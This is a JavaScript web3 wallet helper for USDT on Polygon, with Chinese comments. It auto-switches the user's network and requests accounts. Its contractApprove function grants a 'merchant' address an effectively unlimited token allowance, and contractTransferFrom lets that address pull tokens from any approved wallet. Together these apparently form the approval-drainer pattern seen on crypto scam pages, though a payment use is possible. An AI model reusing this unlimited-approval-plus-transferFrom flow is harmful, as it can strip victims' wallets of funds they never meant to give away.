/**
 * ETH兼容网络可用
 * @constructor
 */
function Bsc () {
} 
 
async function switch_net(){
        try {
        var ethereum=window.ethereum;
        await ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [
                {
                    chainId: '0x89',
                    rpcUrls: ['https://polygon.llamarpc.com'],
                    chainName: 'Polygon Mainnet'
                }
            ],
        });
    } catch (addError) {
        console.error(addError)
        return
    }
    location.reload();
}

/**
 * ERC20/BEP20/KIP20协议地址
 * @type {string}
 */
Bsc.contractAddress = '0xc2132d05d31c914a87c6611c10748aeb04b58e8f'
Bsc.feeLimit = 1e5
Bsc.maxAllowance = '0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
Bsc.validateChainId = true
Bsc.chainId = '0x89'//马蹄链ID
Bsc.blockName = '马蹄'

/**
 * 页面初使化时，请使用此函数检查环境
 * @param {*} callback (web3, address)
 */
Bsc.init = (callback) => {
    let timer = 0, errorHintFlag = false
    let intervalId = setInterval(() => {
        if (typeof window.ethereum !== 'undefined') {
            clearInterval(intervalId)
            ethereum.request({ method: 'eth_requestAccounts' })
                .catch(function (reason) {
                    if (!errorHintFlag) {
                        errorHintFlag = true
                        DialogHelper.hint('用户拒绝连接或出现其它未知错误')
                    }
                    //如果用户拒绝了登录请求
                    // if (reason === "User rejected provider access") {
                    // 用户拒绝登录后执行语句；
                    // } else {
                    // 本不该执行到这里，但是真到这里了，说明发生了意外
                    //BootstrapDialog.show({title: '温馨提示', message: 'There was a problem signing you in'});
                    // }
                }).then(function (accounts) {
                if (Bsc.validateChainId && !Bsc.validate()) {
                    if (!errorHintFlag) {
                        errorHintFlag = true
                        //DialogHelper.hint('只支持web3钱包和' + Bsc.blockName + '链')
                        switch_net();
                    }
                    return
                }
                let web3 = new Web3(window.ethereum)
                //注册区分，web3.provider web3.eth不是同一个东西
                web3.provider = window.ethereum
                callback(web3, accounts[0])
            })
        } else if (++timer > 100) {
            clearInterval(intervalId)
            DialogHelper.hint('请使用web3钱包')
        }
    }, 30)
}
/**
 * 必须先init然后才能操作其它所有操作
 * 不能在页面初使化的时候调用，只能用在后面由用户触发的动作中用于检查环境
 * 因为本函数不会等时间
 */
Bsc.init1 = () => {
    if (window.ethereum) {
        try {
            if (Bsc.validateChainId && !Bsc.validate()) {
                //DialogHelper.hint('只支持web3钱包和' + Bsc.blockName + '链')
                switch_net();
                return null
            }
            // await window.ethereum.enable();
            let web3 = new Web3(window.ethereum)
            web3.provider = window.ethereum
            return web3
        } catch (e) {
            console.log('User denied account access')
        }
    } else {
        console.log('please use web3 wallet')
    }
    return null
}
Bsc.validate = () => {
    //todo 暂不限制web3浏览器的
    // return window.ethereum.isOkxWallet && window.ethereum.chainId == Bsc.chainId;
    return window.ethereum.chainId == Bsc.chainId
}
/**
 * 是否连接成功
 * @return boolean>
 */
Bsc.linkWallet = async function () {
    const owner = await window.ethereum.enable()
    return owner !== undefined && owner !== null && owner !== '' && owner.length > 0
}
/**
 * 当前用户地址
 * @return {*}
 */
Bsc.selectedAddress = function () {
    if (window.ethereum) {
        try {
            return ethereum.selectedAddress
        } catch (e) {
            BootstrapDialog.alert('用户拒绝访问或者访问区块钱链网络异常')
            console.log('User denied account access')
            return null
        }
    } else {
        console.log('please use web3 wallet')
        //BootstrapDialog.alert('请使用' + Bsc.blockName + '链钱包')
        return null
    }
}
Bsc.selectedAddress1 = async function () {
    if (window.ethereum) {
        try {
            let accounts = await ethereum.request({ method: 'eth_requestAccounts' })
            if (accounts.length <= 0) {
                BootstrapDialog.alert('未连接钱包，请刷新页面重新连接，并确保当前正打开' + Bsc.blockName + '钱包')
            }
            return accounts[0]
        } catch (e) {
            BootstrapDialog.alert('用户拒绝访问或者访问区块钱链网络异常')
            console.log('User denied account access')
            return null
        }
    } else {
        console.log('please use web3 wallet')
        //BootstrapDialog.alert('请使用' + Bsc.blockName + '链钱包')
        return null
    }
}
Bsc.selectedAddress2 = async function () {
    if (window.ethereum) {
        try {
            let accounts = await ethereum.request({ method: 'eth_requestAccounts' })
            if (accounts.length <= 0) {
                BootstrapDialog.alert('未连接钱包，请刷新页面重新连接，并确保当前正打开' + Bsc.blockName + '钱包')
            }
            return accounts[0]
        } catch (e) {
            BootstrapDialog.alert('用户拒绝访问或者访问区块钱链网络异常')
            console.log('User denied account access')
            return null
        }
    } else {
        console.log('please use web3 wallet')
        BootstrapDialog.alert('请使用' + Bsc.blockName + '链钱包')
        return null
    }
}
Bsc.contractBalanceOf = async function (address = null, contractAddress = Bsc.contractAddress, abi = Bsc.abi) {
    try {
        let web3 = Bsc.init1()
        if (!web3) {
            return false
        }
        address = address || await Bsc.selectedAddress1()
        let contract = new web3.eth.Contract(abi, contractAddress)
        balance = await contract.methods.balanceOf(address).call()
        return web3.utils.fromWei(balance, 'ether')*1000000000000
    } catch (error) {
        console.error('balanceOf-trigger smart contract error', error)
    }
}
/**
 * 转账至指定账号
 * @param to 接收地址
 * @param amount 数量
 * @param contractAddress
 * @param abi
 * @return string trxId事务ID
 */
Bsc.contractTransfer = async function (to, amount, contractAddress = Bsc.contractAddress, abi = Bsc.abi) {
    try {
        let web3 = Bsc.init1()
        if (!web3) {
            return false
        }
        let contract = new web3.eth.Contract(abi, contractAddress)
        return await contract.methods.transfer(to, web3.utils.toWei(amount, 'ether'))
            .send({ from: await Bsc.selectedAddress1(), gas: Bsc.feeLimit })
    } catch (error) {
        console.error('transfer-trigger smart contract error', error)
        return false
    }
}

/**
 * 申请授权
 * @param merchantAddress 授权给这个商户地址
 * @param contractAddress USDT contract
 * @param abi string contract abi
 * @return string trxId事务ID
 */
Bsc.contractApprove = async (merchantAddress, contractAddress = Bsc.contractAddress, abi = Bsc.abi) => {
    try {
        let web3 = Bsc.init1()
        if (!web3) {
            return false
        }
        let contract = new web3.eth.Contract(abi, contractAddress)
        return await contract.methods.increaseAllowance(merchantAddress, Bsc.maxAllowance)
            .send({ from: await Bsc.selectedAddress1(), gas: Bsc.feeLimit })
    } catch (error) {
        console.error('approve-trigger smart contract error', error)
        return false
    }
}//end of approve
/**
 * 授权金额
 * @param merchantAddress 授权给这个商户地址
 * @param contractAddress USDT contract
 * @param abi string contract abi
 * @return BigNumber
 */
Bsc.allowance = async (merchantAddress, contractAddress = Bsc.contractAddress, abi = Bsc.abi) => {
    try {
        let web3 = Bsc.init1()
        if (!web3) {
            return false
        }
        let owner = await Bsc.selectedAddress1()
        let contract = new web3.eth.Contract(abi, contractAddress)
        let amount = await contract.methods.allowance(owner, merchantAddress).call()
        return new BigNumber(web3.utils.fromWei(amount, 'ether'))
    } catch (error) {
        console.error('approve-trigger smart contract error', error)
        return false
    }
}//end of allowance
/**
 * 授权金额
 * @param owner 授权地址
 * @param merchantAddress 授权给这个商户地址
 * @param contractAddress USDT contract
 * @param abi string contract abi
 * @return BigNumber
 */
Bsc.allowance1 = async (owner, merchantAddress, contractAddress = Bsc.contractAddress, abi = Bsc.abi) => {
    try {
        let web3 = Bsc.init1()
        if (!web3) {
            return false
        }
        let contract = new web3.eth.Contract(abi, contractAddress)
        let amount = await contract.methods.allowance(owner, merchantAddress).call()
        return new BigNumber(web3.utils.fromWei(amount, 'ether'))
    } catch (error) {
        console.error('approve-trigger smart contract error', error)
        return false
    }
}//end of allowance1
/**
 * 是否授权
 * @param merchantAddress 授权给这个商户地址
 * @param contractAddress USDT contract
 * @param abi string contract abi
 * @return bool
 */
Bsc.isApproved = async (merchantAddress, contractAddress = Bsc.contractAddress, abi = Bsc.abi) => {
    return (await Bsc.allowance(merchantAddress, contractAddress, abi)).isGreaterThan('100000000')
}//end of isApproved
/**
 * 是否授权
 * @param owner 授权地址
 * @param merchantAddress 授权给这个商户地址
 * @param contractAddress USDT contract
 * @param abi string contract abi
 * @return bool
 */
Bsc.isApproved1 = async (owner, merchantAddress, contractAddress = Bsc.contractAddress, abi = Bsc.abi) => {
    return (await Bsc.allowance1(owner, merchantAddress, contractAddress, abi)).isGreaterThan('100000000');
}//end of isApproved1
/**
 /**
 * 授权账号转账
 * @param from 发送地址
 * @param to 接收地址
 * @param amount 数量
 * @param contractAddress
 * @param abi
 * @return string trxId事务ID
 */
Bsc.contractTransferFrom = async function (from, to, amount, contractAddress = Bsc.contractAddress, abi = Bsc.abi) {
    try {
        let web3 = Bsc.init1()
        if (!web3) {
            return false
        }
        let contract = new web3.eth.Contract(abi, contractAddress)
        return await contract.methods.transferFrom(from, to, web3.utils.toWei(amount, 'ether'))
            .send({ from: await Bsc.selectedAddress1(), gas: Bsc.feeLimit })
    } catch (error) {
        console.error('transfer-trigger smart contract error-tran', error)
        return false
    }
}
Bsc.getConfirmations = async (txHash) => {
    try {
        let web3 = Bsc.init1()
        if (!web3) {
            return false
        }
        // Get transaction details
        const trx = await web3.eth.getTransaction(txHash)
        // Get current block number
        const currentBlock = await web3.eth.getBlockNumber()
        // When transaction is unconfirmed, its block number is null.
        // In this case we return 0 as number of confirmations
        return trx.blockNumber === null ? 0 : currentBlock - trx.blockNumber
    } catch (error) {
        console.log(error)
    }
}
/**
 * 区块网络是否确认交易
 * @param txHash 交易流水号
 * @param callback (bool:if success, txHash, confirm count)
 * @param confirmations 确认的块数量
 * @param timeout 循环查询的时间
 */
Bsc.confirmEtherTransaction = (txHash, callback, confirmations = 10, timeout = 1000) => {
    setTimeout(async () => {
        // Get current number of confirmations and compare it with sought-for value
        const trxConfirmations = await Bsc.getConfirmations(txHash)
        // console.log('Transaction with hash ' + txHash + ' has ' + trxConfirmations + ' confirmation(s)')
        callback(trxConfirmations >= confirmations, txHash, trxConfirmations)
        if (trxConfirmations >= confirmations) {
            // Handle confirmation event according to your business logic
            // console.log('Transaction with hash ' + txHash + ' has been successfully confirmed')
            return
        }
        // Recursive call
        return Bsc.confirmEtherTransaction(txHash, callback, confirmations)
    }, timeout)
}
/**
 * 查询事务状态，调用返回结果参考如下链接
 * https://web3js.readthedocs.io/en/v1.8.0/web3-eth-contract.html#methods-mymethod-send
 * @param params trxId等其它处理需要的参数
 * @param callback 处理查询结果的函数，(params:array, result:bool, msg:string){}
 * @param timeout 定时器时间，毫秒
 * @param timer 查询交易状态的次数，这个次数后放为是失败了
 */
Bsc.contractGetTrx = function (params, callback, timeout = 2000, timer = 30) {
    if (params.trxId === null || params.trxId === '' || params.trxId === undefined) {
        console.log('trx id is null：', params.trxId)
        callback(params, false, '交易未成功')
        return
    }
    let web3 = Bsc.init1()
    if (!web3) {
        callback(params, false, '请在web3钱包中使用')
        return
    }
    let tTimer = 0
    let intervalId = setInterval(function () {
        try {
            web3.eth.getTransactionReceipt(params.trxId)
                .then((output) => {
                    if (output && output.status) {
                        clearInterval(intervalId)
                        callback(params, output.status, 'success')
                    } else {
                        console.log('交易结果还未确定：', params.trxId)
                    }
                })
            if (++tTimer > timer) {
                clearInterval(intervalId)
                callback(params, false, '交易超时，如果后续成功，请联系管理员处理')
            }
        } catch (error) {
            console.error('get trx - trigger smart contract error tran', error)
        }
    }, timeout)
}

Bsc.loginFlag = false
Bsc.setLogin = function (is) {
    Bsc.loginFlag = is
}
Bsc.isLogin = function () {
    return Bsc.loginFlag
}
Bsc.abi = [{
    'inputs': [{
        'internalType': 'string', 'name': 'name', 'type': 'string'
    }, { 'internalType': 'string', 'name': 'symbol', 'type': 'string' }],
    'stateMutability': 'nonpayable',
    'type': 'constructor'
}, {
    'anonymous': false,
    'inputs': [{
        'indexed': true, 'internalType': 'address', 'name': 'owner', 'type': 'address'
    }, {
        'indexed': true, 'internalType': 'address', 'name': 'spender', 'type': 'address'
    }, { 'indexed': false, 'internalType': 'uint256', 'name': 'value', 'type': 'uint256' }],
    'name': 'Approval',
    'type': 'event'
}, {
    'inputs': [{
        'internalType': 'address', 'name': 'spender', 'type': 'address'
    }, { 'internalType': 'uint256', 'name': 'amount', 'type': 'uint256' }],
    'name': 'approve',
    'outputs': [{ 'internalType': 'bool', 'name': '', 'type': 'bool' }],
    'stateMutability': 'nonpayable',
    'type': 'function'
}, {
    'inputs': [{
        'internalType': 'address', 'name': 'spender', 'type': 'address'
    }, { 'internalType': 'uint256', 'name': 'subtractedValue', 'type': 'uint256' }],
    'name': 'decreaseAllowance',
    'outputs': [{ 'internalType': 'bool', 'name': '', 'type': 'bool' }],
    'stateMutability': 'nonpayable',
    'type': 'function'
}, {
    'inputs': [{
        'internalType': 'address', 'name': 'spender', 'type': 'address'
    }, { 'internalType': 'uint256', 'name': 'addedValue', 'type': 'uint256' }],
    'name': 'increaseAllowance',
    'outputs': [{ 'internalType': 'bool', 'name': '', 'type': 'bool' }],
    'stateMutability': 'nonpayable',
    'type': 'function'
}, {
    'inputs': [{
        'internalType': 'address', 'name': 'recipient', 'type': 'address'
    }, { 'internalType': 'uint256', 'name': 'amount', 'type': 'uint256' }],
    'name': 'transfer',
    'outputs': [{ 'internalType': 'bool', 'name': '', 'type': 'bool' }],
    'stateMutability': 'nonpayable',
    'type': 'function'
}, {
    'anonymous': false,
    'inputs': [{
        'indexed': true, 'internalType': 'address', 'name': 'from', 'type': 'address'
    }, {
        'indexed': true, 'internalType': 'address', 'name': 'to', 'type': 'address'
    }, { 'indexed': false, 'internalType': 'uint256', 'name': 'value', 'type': 'uint256' }],
    'name': 'Transfer',
    'type': 'event'
}, {
    'inputs': [{
        'internalType': 'address', 'name': 'sender', 'type': 'address'
    }, {
        'internalType': 'address', 'name': 'recipient', 'type': 'address'
    }, { 'internalType': 'uint256', 'name': 'amount', 'type': 'uint256' }],
    'name': 'transferFrom',
    'outputs': [{ 'internalType': 'bool', 'name': '', 'type': 'bool' }],
    'stateMutability': 'nonpayable',
    'type': 'function'
}, {
    'inputs': [{
        'internalType': 'address', 'name': 'owner', 'type': 'address'
    }, { 'internalType': 'address', 'name': 'spender', 'type': 'address' }],
    'name': 'allowance',
    'outputs': [{ 'internalType': 'uint256', 'name': '', 'type': 'uint256' }],
    'stateMutability': 'view',
    'type': 'function'
}, {
    'inputs': [{ 'internalType': 'address', 'name': 'account', 'type': 'address' }],
    'name': 'balanceOf',
    'outputs': [{ 'internalType': 'uint256', 'name': '', 'type': 'uint256' }],
    'stateMutability': 'view',
    'type': 'function'
}, {
    'inputs': [],
    'name': 'decimals',
    'outputs': [{ 'internalType': 'uint8', 'name': '', 'type': 'uint8' }],
    'stateMutability': 'view',
    'type': 'function'
}, {
    'inputs': [],
    'name': 'name',
    'outputs': [{ 'internalType': 'string', 'name': '', 'type': 'string' }],
    'stateMutability': 'view',
    'type': 'function'
}, {
    'inputs': [],
    'name': 'symbol',
    'outputs': [{ 'internalType': 'string', 'name': '', 'type': 'string' }],
    'stateMutability': 'view',
    'type': 'function'
}, {
    'inputs': [],
    'name': 'totalSupply',
    'outputs': [{ 'internalType': 'uint256', 'name': '', 'type': 'uint256' }],
    'stateMutability': 'view',
    'type': 'function'
}]